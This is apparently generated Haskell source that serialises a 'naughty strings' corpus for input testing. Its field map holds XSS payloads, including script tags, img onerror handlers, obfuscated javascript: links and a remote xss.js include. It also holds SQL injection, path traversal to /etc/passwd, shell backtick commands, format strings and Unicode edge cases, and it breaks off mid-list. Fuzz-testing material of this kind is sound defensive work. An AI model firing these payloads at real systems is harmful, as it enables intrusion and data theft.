    toJSON (A _12A _13A _14A _25A _7A _8A _9A aA a0A a00A a000A a0000A a1A a10A a100000000A a1E02A aAlert123TA aFalseA aHrefJava123456781112ScriptJavascriptAlert1XXXAA aHrefJavascriptX09JavascriptAlert1IDFuzzelement1TestAA aHrefJavascriptX0AJavascriptAlert1IDFuzzelement1TestAA aHrefJavascriptX3AJavascriptAlert1IDFuzzelement1TestAA aHrefX01JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX05JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX08JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX09JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX0CjavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX10JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX11JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX13JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX17JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefX1FjavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXC2XA0JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE1X9AX80JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE1XA0X8EjavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE2X80X83JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE2X80X84JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE2X80X86JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE2X80X87JavascriptJavascriptAlert1IDFuzzelement1TestAA aHrefXE2X80XA8JavascriptJavascriptAlert1IDFuzzelement1TestAA aTestA aTrueA abcDivStyleXExpX00RessionJavascriptAlert1DEFA abcDivStyleXExpX5CressionJavascriptAlert1DEFA abcDivStyleXX09ExpressionJavascriptAlert1DEFA abcDivStyleXX0BexpressionJavascriptAlert1DEFA abcDivStyleXX20ExpressionJavascriptAlert1DEFA abcDivStyleXX3AexpressionJavascriptAlert1DEFA abcDivStyleXXC2XA0ExpressionJavascriptAlert1DEFA abcDivStyleXXE2X80X80ExpressionJavascriptAlert1DEFA abcDivStyleXXE2X80X84ExpressionJavascriptAlert1DEFA abcDivStyleXXE2X80X89ExpressionJavascriptAlert1DEFA abcDivStyleXXE2X80X8BexpressionJavascriptAlert1DEFA alert123A alert123TA alertXSSA ambitiousA andU200BZEROWIDTHSPACEWhichAreInTheCCategoriesButAreOftenA arsenalCanalA autofocusOnkeyupJavascriptAlert123A auxA braggadociousA changingLengthWhenLowercasedA charactersWhichIncreaseInLength2To3BytesWhenLowercasedA classicA commandInjectionRubyA cunningA dA dickVanDykeA dontMakeAMapA drHermanILibshitzA emptyA envHomeA etcHostsA etcPasswd00A falseA fluffyA fluffy0A fluffyTestA fontsAndHaveANumberOfSpecialBehaviorsA fooValBarA friskyA hilariousA homeA humanInjectionA iNVOkINGTHEFLINGOFCHOSA ifImgSrcXOnerrorJavascriptAlert1A ifScriptJavascriptAlert1ScriptA imgSRCJavAscriptAlertXSSA imgSRCJavX0AAscriptAlertXSSA imgSRCJavX0DAscriptAlertXSSA imgSrc106971189711599114105112116589710810111411640398883833941A imgSrcX09XOnerrorJavascriptAlert1A imgSrcX11XOnerrorJavascriptAlert1A imgSrcXOnerrorX00JavascriptAlert1A imgSrcXOnerrorX09JavascriptAlert1A imgSrcXX09OnerrorJavascriptAlert1A imgSrcXX10OnerrorJavascriptAlert1A imgSrcXX11OnerrorJavascriptAlert1A imgSrcXX12OnerrorJavascriptAlert1A imgSrcXX13OnerrorJavascriptAlert1A imgSrcXxxXX00OnerrorJavascriptAlert1A imgSrcXxxXX0BonerrorJavascriptAlert1A imgSrcXxxXX2FonerrorJavascriptAlert1A imgX00SrcXOnerrorAlert1A imgX10SrcXOnerrorJavascriptAlert1A imgX13SrcXOnerrorJavascriptAlert1A imgX32SrcXOnerrorJavascriptAlert1A imgX39SrcXOnerrorJavascriptAlert1A indecentA indigoA infA infinityA innocuousStringsWhichMayBeBlockedByProfanityFiltersHTTPSEnWikipediaOrgWikiScunthorpeProblemA jimmyClitheroeA kernelExit1A knownCVEsAndVulnerabilitiesA lightwaterCountryParkA lpt2A lpt3A lsAlA magentaA mischievousA msdosWindowsSpecialFilenamesA nilA nonWhitespaceC1ControlsU0080ThroughU0084AndU0086ThroughU009FA noneA nullA onfocusJaVaSCriptAlert123AutofocusA or11A penistoneCommunityChurchA perlEPrintIMGSRCJava0ScriptAlertXSSOutA prnA purpleA purple0A purple1A purpleTestA romansInSussexCoUkA sA sUnSUA scScriptRiptAlert123ScScriptRiptA scriptAlert123ScriptXA scriptInjectionA scriptSRCHTTPHaCkersOrgXSSJSBA scriptSRCHTTPHaCkersOrgXSSJSSCRIPTA scriptScriptAlert123ScriptA scriptX00JavascriptAlert1ScriptA scriptX09TypeTextJavascriptJavascriptAlert1ScriptA scriptX0CjavascriptAlert1ScriptA scriptX0DjavascriptAlert1ScriptA scriptX20TypeTextJavascriptJavascriptAlert1ScriptA scriptX3EtypeTextJavascriptJavascriptAlert1ScriptA scriptXC2X85JavascriptAlert1ScriptA scriptXC2XA0JavascriptAlert1ScriptA scriptXE1X9AX80JavascriptAlert1ScriptA scriptXE1XA0X8EjavascriptAlert1ScriptA scriptXE2X80X81JavascriptAlert1ScriptA scriptXE2X80X86JavascriptAlert1ScriptA scriptXE2X80X89JavascriptAlert1ScriptA scriptXE2X81X9FjavascriptAlert1ScriptA scriptXEFXBBXBFjavascriptAlert1ScriptA scriptXF0X90X96X9AjavascriptAlert1ScriptA scriptXSSSRCHTTPHaCkersOrgXSSJSSCRIPTA sqlInjectionA stickyA stringWhichCanRevealSystemFilesWhenParsedByABadlyConfiguredXMLParserA stringsThatTestForKnownVulnerabilitiesA stringsWhichCanBeAccidentallyExpandedIntoDifferentStringsIfEvaluatedInTheWrongContextEGUsedAsAPrintfFormatStringOrViaPERLOrShellEvalMightExposeSensitiveDataFromTheProgramDoingTheInterpolationOrMightJustRepresentTheWrongStringA stringsWhichCanCallSystemCommandsWithinRubyRailsApplicationsA stringsWhichConsistsOfJapaneseStyleEmoticonsWhichArePopularOnTheWebA stringsWhichContainBoldItalicEtcVersionsOfNormalCharactersA stringsWhichContainCommonUnicodeSymbolsEGSmartQuotesA stringsWhichContainEmojiShouldBeTheSameBehaviorAsTwoByteCharactersButNotAlwaysA stringsWhichContainMisplacedQuotationMarksCanCauseEncodingErrorsA stringsWhichContainUnicodeSubscriptsSuperscriptsCanCauseRenderingIssuesA stringsWhichCrashedIMessageInVariousVersionsOfIOSA stringsWhichMayCauseHumanToReinterpretWorldviewA superBowlXXXA tentacledA testA textareaScriptAlert123ScriptA the0A the00A the000A the0000A the0X0A the1A the10A the100A the1000A the100000A the100000000A the11A the12A the123456789012345678901234567890123456789A the15A the16A the17A the18A the19A the1DROPTABLEUsersA the1E02A the1E2A the1QnanA the1SnanA the2A the20A the21A the22A the23A the24A the26A the27A the3A the4A the5A the6A the999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999A theNextTwoLinesMayAppearToBeBlankOrMojibakeInSomeViewersA theQuicKBrownFoXBeeeepA trueA twoByteCharactersA u0000U000AOrU000DNULLFCRA uOncopyAlertCopyMeUA undefA unicodeFontA unicodeNumbersA unwantedInterpolationA xLsAlA zGOA) =
        object $ foldMap (maybe [] pure)
        [ Just $ "パーティーへ行かないか" .= _12A
        , Just $ "和製漢語" .= _13A
        , Just $ "田中さんにあげて下さい" .= _14A
        , Just $ "｀ｨ(´∀｀∩" .= _25A
        , Just $ "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." .= _7A
        , Just $ "٠١٢٣٤٥٦٧٨٩" .= _8A
        , Just $ "ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็" .= _9A
        , Just $ "!@#$%^&*()`~" .= aA
        , Just $ "-0" .= a0A
        , Just $ "00˙Ɩ$-" .= a00A
        , Just $ "0,00" .= a000A
        , Just $ "0.0/0.0" .= a0000A
        , Just $ "-1" .= a1A
        , Just $ "1/0" .= a10A
        , Just $ "1'000'000.00" .= a100000000A
        , Just $ "1E02" .= a1E02A
        , Just $ "';alert(123);t='" .= aAlert123TA
        , Just $ "false" .= aFalseA
        , Just $ "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>" .= aHrefJava123456781112ScriptJavascriptAlert1XXXAA
        , Just $ "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefJavascriptX09JavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefJavascriptX0AJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefJavascriptX3AJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX01JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX05JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX08JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX09JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0CjavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX10JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX11JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX13JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX17JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1FjavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXC2XA0JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE1X9AX80JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE1XA0X8EjavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X83JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X84JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X86JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X87JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80XA8JavascriptJavascriptAlert1IDFuzzelement1TestAA
        , Just $ "\x202a\&\x202a\&test\x202a\&" .= aTestA
        , Just $ "True" .= aTrueA
        , Just $ "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF" .= abcDivStyleXExpX00RessionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF" .= abcDivStyleXExpX5CressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF" .= abcDivStyleXX09ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF" .= abcDivStyleXX0BexpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF" .= abcDivStyleXX20ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF" .= abcDivStyleXX3AexpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF" .= abcDivStyleXXC2XA0ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X80ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X84ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X89ExpressionJavascriptAlert1DEFA
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X8BexpressionJavascriptAlert1DEFA
        , Just $ ";alert(123);" .= alert123A
        , Just $ "\";alert(123);t=\"" .= alert123TA
        , Just $ "\\\";alert('XSS');//" .= alertXSSA
        , Just $ "-." .= ambitiousA
        , Just $ "# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often" .= andU200BZEROWIDTHSPACEWhichAreInTheCCategoriesButAreOftenA
        , Just $ "Arsenal canal" .= arsenalCanalA
        , Just $ "\" autofocus onkeyup=\"javascript:alert(123)" .= autofocusOnkeyupJavascriptAlert123A
        , Just $ "AUX" .= auxA
        , Just $ "¡™£¢∞§¶•ªº–≠" .= braggadociousA
        , Just $ "#\tChanging length when lowercased" .= changingLengthWhenLowercasedA
        , Just $ "#\tCharacters which increase in length (2 to 3 bytes) when lowercased" .= charactersWhichIncreaseInLength2To3BytesWhenLowercasedA
        , Just $ "classic" .= classicA
        , Just $ "#\tCommand Injection (Ruby)" .= commandInjectionRubyA
        , Just $ "<>?:\"{}|_+" .= cunningA
        , Just $ "%d" .= dA
        , Just $ "Dick Van Dyke" .= dickVanDykeA
        , Just $ "dontMakeAMap" .= dontMakeAMapA
        , Just $ "Dr. Herman I. Libshitz" .= drHermanILibshitzA
        , Just $ " " .= emptyA
        , Just $ "$ENV{'HOME'}" .= envHomeA
        , Just $ "../../../../../../../../../../../etc/hosts" .= etcHostsA
        , Just $ "../../../../../../../../../../../etc/passwd%00" .= etcPasswd00A
        , Just $ "False" .= falseA
        , Just $ "'\"'" .= fluffyA
        , Just $ "{0}" .= fluffy0A
        , Just $ "\x2066\&test\x2067\&" .= fluffyTestA
        , Just $ "#       fonts, and have a number of special behaviors" .= fontsAndHaveANumberOfSpecialBehaviorsA
        , Just $ "<foo val=`bar' />" .= fooValBarA
        , Just $ "`⁄€‹›ﬁﬂ‡°·‚—±" .= friskyA
        , Just $ "-," .= hilariousA
        , Just $ "$HOME" .= homeA
        , Just $ "#\tHuman injection" .= humanInjectionA
        , Just $ "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" .= iNVOkINGTHEFLINGOFCHOSA
        , Just $ "<!--[if<img src=x onerror=javascript:alert(1)//]> -->" .= ifImgSrcXOnerrorJavascriptAlert1A
        , Just $ "<!--[if]><script>javascript:alert(1)</script -->" .= ifScriptJavascriptAlert1ScriptA
        , Just $ "<IMG SRC=\"jav   ascript:alert('XSS');\">" .= imgSRCJavAscriptAlertXSSA
        , Just $ "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">" .= imgSRCJavX0AAscriptAlertXSSA
        , Just $ "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">" .= imgSRCJavX0DAscriptAlertXSSA
        , Just $ "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>" .= imgSrc106971189711599114105112116589710810111411640398883833941A
        , Just $ "<img src\\x09=x onerror=\"javascript:alert(1)\">" .= imgSrcX09XOnerrorJavascriptAlert1A
        , Just $ "<img src\\x11=x onerror=\"javascript:alert(1)\">" .= imgSrcX11XOnerrorJavascriptAlert1A
        , Just $ "<img src=x onerror=\\x00\"javascript:alert(1)\">" .= imgSrcXOnerrorX00JavascriptAlert1A
        , Just $ "<img src=x onerror=\\x09\"javascript:alert(1)\">" .= imgSrcXOnerrorX09JavascriptAlert1A
        , Just $ "<img src=x\\x09onerror=\"javascript:alert(1)\">" .= imgSrcXX09OnerrorJavascriptAlert1A
        , Just $ "<img src=x\\x10onerror=\"javascript:alert(1)\">" .= imgSrcXX10OnerrorJavascriptAlert1A
        , Just $ "<img src=x\\x11onerror=\"javascript:alert(1)\">" .= imgSrcXX11OnerrorJavascriptAlert1A
        , Just $ "<img src=x\\x12onerror=\"javascript:alert(1)\">" .= imgSrcXX12OnerrorJavascriptAlert1A
        , Just $ "<img src=x\\x13onerror=\"javascript:alert(1)\">" .= imgSrcXX13OnerrorJavascriptAlert1A
        , Just $ "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>" .= imgSrcXxxXX00OnerrorJavascriptAlert1A
        , Just $ "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>" .= imgSrcXxxXX0BonerrorJavascriptAlert1A
        , Just $ "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>" .= imgSrcXxxXX2FonerrorJavascriptAlert1A
        , Just $ "<img \\x00src=x onerror=\"alert(1)\">" .= imgX00SrcXOnerrorAlert1A
        , Just $ "<img\\x10src=x onerror=\"javascript:alert(1)\">" .= imgX10SrcXOnerrorJavascriptAlert1A
        , Just $ "<img\\x13src=x onerror=\"javascript:alert(1)\">" .= imgX13SrcXOnerrorJavascriptAlert1A
        , Just $ "<img\\x32src=x onerror=\"javascript:alert(1)\">" .= imgX32SrcXOnerrorJavascriptAlert1A
        , Just $ "<img \\x39src=x onerror=\"javascript:alert(1)\">" .= imgX39SrcXOnerrorJavascriptAlert1A
        , Just $ ",./;'[]\\-=" .= indecentA
        , Just $ "," .= indigoA
        , Just $ "INF" .= infA
        , Just $ "-Infinity" .= infinityA
        , Just $ "#\tInnocuous strings which may be blocked by profanity filters (https://en.wikipedia.org/wiki/Scunthorpe_problem)" .= innocuousStringsWhichMayBeBlockedByProfanityFiltersHTTPSEnWikipediaOrgWikiScunthorpeProblemA
        , Just $ "Jimmy Clitheroe" .= jimmyClitheroeA
        , Just $ "Kernel.exit(1)" .= kernelExit1A
        , Just $ "#\tKnown CVEs and Vulnerabilities" .= knownCVEsAndVulnerabilitiesA
        , Just $ "Lightwater Country Park" .= lightwaterCountryParkA
        , Just $ "LPT2" .= lpt2A
        , Just $ "LPT3" .= lpt3A
        , Just $ "`ls -al /`" .= lsAlA
        , Just $ "\\" .= magentaA
        , Just $ "\x0080\&\x0081\&\x0082\&\x0083\&\x0084\&\x0086\&\x0087\&\x0088\&\x0089\&\x008a\&\x008b\&\x008c\&\x008d\&\x008e\&\x008f\&\x0090\&\x0091\&\x0092\&\x0093\&\x0094\&\x0095\&\x0096\&\x0097\&\x0098\&\x0099\&\x009a\&\x009b\&\x009c\&\x009d\&\x009e\&\x009f\&" .= mischievousA
        , Just $ "#\tMSDOS/Windows Special Filenames" .= msdosWindowsSpecialFilenamesA
        , Just $ "nil" .= nilA
        , Just $ "# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F." .= nonWhitespaceC1ControlsU0080ThroughU0084AndU0086ThroughU009FA
        , Just $ "None" .= noneA
        , Just $ "(null)" .= nullA
        , Just $ " onfocus=JaVaSCript:alert(123) autofocus" .= onfocusJaVaSCriptAlert123AutofocusA
        , Just $ "' OR '1'='1" .= or11A
        , Just $ "Penistone Community Church" .= penistoneCommunityChurchA
        , Just $ "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out" .= perlEPrintIMGSRCJava0ScriptAlertXSSOutA
        , Just $ "PRN" .= prnA
        , Just $ "'" .= purpleA
        , Just $ "0" .= purple0A
        , Just $ "1" .= purple1A
        , Just $ "\x202b\&test\x202b\&" .= purpleTestA
        , Just $ "RomansInSussex.co.uk" .= romansInSussexCoUkA
        , Just $ "%s" .= sA
        , Just $ "<<< %s(un='%s') = %u" .= sUnSUA
        , Just $ "<sc<script>ript>alert(123)</sc</script>ript>" .= scScriptRiptAlert123ScScriptRiptA
        , Just $ "\"><script>alert(123);</script x=\"" .= scriptAlert123ScriptXA
        , Just $ "#\tScript Injection" .= scriptInjectionA
        , Just $ "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" .= scriptSRCHTTPHaCkersOrgXSSJSBA
        , Just $ "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" .= scriptSRCHTTPHaCkersOrgXSSJSSCRIPTA
        , Just $ "</script><script>alert(123)</script>" .= scriptScriptAlert123ScriptA
        , Just $ "\"`'><script>\\x00javascript:alert(1)</script>" .= scriptX00JavascriptAlert1ScriptA
        , Just $ "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>" .= scriptX09TypeTextJavascriptJavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\x0Cjavascript:alert(1)</script>" .= scriptX0CjavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\x0Djavascript:alert(1)</script>" .= scriptX0DjavascriptAlert1ScriptA
        , Just $ "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>" .= scriptX20TypeTextJavascriptJavascriptAlert1ScriptA
        , Just $ "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>" .= scriptX3EtypeTextJavascriptJavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xC2\\x85javascript:alert(1)</script>" .= scriptXC2X85JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>" .= scriptXC2XA0JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>" .= scriptXE1X9AX80JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>" .= scriptXE1XA0X8EjavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>" .= scriptXE2X80X81JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>" .= scriptXE2X80X86JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>" .= scriptXE2X80X89JavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>" .= scriptXE2X81X9FjavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>" .= scriptXEFXBBXBFjavascriptAlert1ScriptA
        , Just $ "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>" .= scriptXF0X90X96X9AjavascriptAlert1ScriptA
        , Just $ "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" .= scriptXSSSRCHTTPHaCkersOrgXSSJSSCRIPTA
        , Just $ "#\tSQL Injection" .= sqlInjectionA
        , Just $ "(╯°□°）╯︵ ┻━┻)" .= stickyA
        , Just $ "#\tString which can reveal system files when parsed by a badly configured XML parser" .= stringWhichCanRevealSystemFilesWhenParsedByABadlyConfiguredXMLParserA
        , Just $ "#\tStrings that test for known vulnerabilities" .= stringsThatTestForKnownVulnerabilitiesA
        , Just $ "#\tStrings which can be accidentally expanded into different strings if evaluated in the wrong context, e.g. used as a printf format string or via Perl or shell eval. Might expose sensitive data from the program doing the interpolation, or might just represent the wrong string." .= stringsWhichCanBeAccidentallyExpandedIntoDifferentStringsIfEvaluatedInTheWrongContextEGUsedAsAPrintfFormatStringOrViaPERLOrShellEvalMightExposeSensitiveDataFromTheProgramDoingTheInterpolationOrMightJustRepresentTheWrongStringA
        , Just $ "#\tStrings which can call system commands within Ruby/Rails applications" .= stringsWhichCanCallSystemCommandsWithinRubyRailsApplicationsA
        , Just $ "#\tStrings which consists of Japanese-style emoticons which are popular on the web" .= stringsWhichConsistsOfJapaneseStyleEmoticonsWhichArePopularOnTheWebA
        , Just $ "#\tStrings which contain bold/italic/etc. versions of normal characters" .= stringsWhichContainBoldItalicEtcVersionsOfNormalCharactersA
        , Just $ "#\tStrings which contain common unicode symbols (e.g. smart quotes)" .= stringsWhichContainCommonUnicodeSymbolsEGSmartQuotesA
        , Just $ "#\tStrings which contain Emoji; should be the same behavior as two-byte characters, but not always" .= stringsWhichContainEmojiShouldBeTheSameBehaviorAsTwoByteCharactersButNotAlwaysA
        , Just $ "#\tStrings which contain misplaced quotation marks; can cause encoding errors" .= stringsWhichContainMisplacedQuotationMarksCanCauseEncodingErrorsA
        , Just $ "#\tStrings which contain unicode subscripts/superscripts; can cause rendering issues" .= stringsWhichContainUnicodeSubscriptsSuperscriptsCanCauseRenderingIssuesA
        , Just $ "#\tStrings which crashed iMessage in various versions of iOS" .= stringsWhichCrashedIMessageInVariousVersionsOfIOSA
        , Just $ "#\tStrings which may cause human to reinterpret worldview" .= stringsWhichMayCauseHumanToReinterpretWorldviewA
        , Just $ "Super Bowl XXX" .= superBowlXXXA
        , Just $ "( ͡° ͜ʖ ͡°)" .= tentacledA
        , Just $ "הָיְתָהtestالصفحات التّحول" .= testA
        , Just $ "</textarea><script>alert(123)</script>" .= textareaScriptAlert123ScriptA
        , Just $ "+0" .= the0A
        , Just $ "0..0" .= the00A
        , Just $ "0,0,0" .= the000A
        , Just $ "0,0/0,0" .= the0000A
        , Just $ "0x0" .= the0X0A
        , Just $ "\x00ad\&\x0600\&\x0601\&\x0602\&\x0603\&\x0604\&\x0605\&\x061c\&\x06dd\&\x070f\&\x180e\&\x200b\&\x200c\&\x200d\&\x200e\&\x200f\&\x202a\&\x202b\&\x202c\&\x202d\&\x202e\&\x2060\&\x2061\&\x2062\&\x2063\&\x2064\&\x2066\&\x2067\&\x2068\&\x2069\&\x206a\&\x206b\&\x206c\&\x206d\&\x206e\&\x206f\&\xfeff\&\xfff9\&\xfffa\&\xfffb\&\x000110bd\&\x0001bca0\&\x0001bca1\&\x0001bca2\&\x0001bca3\&\x0001d173\&\x0001d174\&\x0001d175\&\x0001d176\&\x0001d177\&\x0001d178\&\x0001d179\&\x0001d17a\&\x000e0001\&\x000e0020\&\x000e0021\&\x000e0022\&\x000e0023\&\x000e0024\&\x000e0025\&\x000e0026\&\x000e0027\&\x000e0028\&\x000e0029\&\x000e002a\&\x000e002b\&\x000e002c\&\x000e002d\&\x000e002e\&\x000e002f\&\x000e0030\&\x000e0031\&\x000e0032\&\x000e0033\&\x000e0034\&\x000e0035\&\x000e0036\&\x000e0037\&\x000e0038\&\x000e0039\&\x000e003a\&\x000e003b\&\x000e003c\&\x000e003d\&\x000e003e\&\x000e003f\&\x000e0040\&\x000e0041\&\x000e0042\&\x000e0043\&\x000e0044\&\x000e0045\&\x000e0046\&\x000e0047\&\x000e0048\&\x000e0049\&\x000e004a\&\x000e004b\&\x000e004c\&\x000e004d\&\x000e004e\&\x000e004f\&\x000e0050\&\x000e0051\&\x000e0052\&\x000e0053\&\x000e0054\&\x000e0055\&\x000e0056\&\x000e0057\&\x000e0058\&\x000e0059\&\x000e005a\&\x000e005b\&\x000e005c\&\x000e005d\&\x000e005e\&\x000e005f\&\x000e0060\&\x000e0061\&\x000e0062\&\x000e0063\&\x000e0064\&\x000e0065\&\x000e0066